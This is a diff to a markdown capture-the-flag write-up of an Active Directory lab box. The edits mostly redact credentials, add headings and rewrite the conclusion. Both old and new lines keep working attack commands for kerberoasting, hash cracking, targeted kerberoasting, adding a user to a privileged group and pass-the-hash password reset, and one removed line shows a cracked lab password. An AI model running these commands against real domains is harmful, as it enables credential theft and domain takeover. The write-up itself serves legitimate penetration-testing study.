@@ -112,7 +112,7 @@ $krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:4692a29239f877941cf3b036d2b2e035$a220a7d2
 
 Kerberoasting is an Active Directory attack technique where an attacker requests service tickets (TGS) for accounts with Service Principal Names (SPNs) and extracts them for offline password cracking. Since these tickets are encrypted using the service account’s password hash, weak passwords can be cracked to recover credentials, which can then be used for privilege escalation within the domain.
 
-```
+```bash
 nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerb.txt
 ```
 
@@ -130,7 +130,7 @@ hashcat -m 13100 hash.txt rockyou.txt
 
 ```
 Cracked the hash
-CODY_ROY:MKO)mko0
+CODY_ROY:M[REDACTED]0
 ```
 
 ![Cody-img](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Cody-img.png)
@@ -138,6 +138,8 @@ CODY_ROY:MKO)mko0
 - Cody's credentials are valid. 
 
 - We got a valid password so we can try passwordspray attack to check whether the password is reused using kerbrute.
+
+### Password Spraying
 
 Kerbrute is a tool used for enumerating valid usernames and performing password attacks against Active Directory using the Kerberos protocol. It works by sending authentication requests to the domain controller and analyzing the responses to identify valid users without triggering typical account lockout policies. Kerbrute is commonly used for user enumeration and password spraying during the initial stages of an Active Directory penetration test.
 
@@ -151,14 +153,16 @@ Kerbrute is a tool used for enumerating valid usernames and performing password 
 
 - We have generic write over Jerri_lancaster from Zachary so we can try Targeted kerberoasting.
 
+### Targeted Kerberoasting
+
 ```bash
-targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p '<Zachary-Password>' --dc-ip <Machine-IP>
+targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p '[REDACTED]' --dc-ip <Machine-IP>
 ```
 - 
 ![Targeted-kerb](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Targeted-kerb.png)
 
 ```
-JERRI_LANCASTER:<Jerri-Password>
+JERRI_LANCASTER:[REDACTED]
 ```
 
 ![WriteOwner](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/WriteOwner.png)
@@ -167,14 +171,14 @@ JERRI_LANCASTER:<Jerri-Password>
 
 ## Adding the user to the group
 
-```
-net rpc group addmem "READER ADMINS" "JERRI_LANCASTER" -U "thm.local"/'JERRI_LANCASTER'%'<Jerri-Password>' -S "<DC-IP>"
+```bash
+net rpc group addmem "READER ADMINS" "JERRI_LANCASTER" -U "thm.local"/'JERRI_LANCASTER'%'[REDACTED]' -S "<DC-IP>"
 ```
 
 - Verifying
 
-```
-net rpc group members "READER ADMINS" -U "thm.local"/'JERRI_LANCASTER'%'<Jerri-Password>' -S "<DC-IP> 
+```bash
+net rpc group members "READER ADMINS" -U "thm.local"/'JERRI_LANCASTER'%'[REDACTED]' -S "<DC-IP> 
 THM\JERRI_LANCASTER
 ```
 
@@ -184,17 +188,17 @@ THM\JERRI_LANCASTER
 
 ![Sanford-cred](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/Sanford-cred.png)
 ```
-SANFORD_DAUGHERTY:<Sanford-Password>
+SANFORD_DAUGHERTY:[REDACTED]
 ```
 
-## Dumping NTDS.dit
+# Dumping NTDS.dit
 
 ![ntds](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/ntds.png)
 
-## Changed the password of the administrator and RDP as the user and got flag
+## Changing the password of the administrator and RDP as the user and got flag
 
 ```
-nxc smb thm.local -u administrator -H "<Admin's Hash>" -M change-password -o NEWPASS=Password@123
+nxc smb thm.local -u administrator -H "[REDACTED]" -M change-password -o NEWPASS=Password@123
 ```
 
 ![admin](https://c00lrabbit.github.io/assets/Images/Operation-Endgame/admin.png)
@@ -203,8 +207,10 @@ nxc smb thm.local -u administrator -H "<Admin's Hash>" -M change-password -o NEW
 
 
 ## Conclusion
-- Bypassing the login page is bit tricky and getting the password list you have to think outside the box.
-- Privilege escalation is Stright forward.
-- Overall it is a good machine to Test you bruteforcing skills and Enumeration skills.
+- Simulated a real-world Active Directory attack from start to finish.
+- Gained access through enumeration and credential attacks.
+- Escalated privileges by abusing AD misconfigurations.
+- Used tools like BloodHound to find attack paths.
+- Successfully achieved domain compromise, showing the risks of weak security setups.
 
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/O4O31I0TAI)
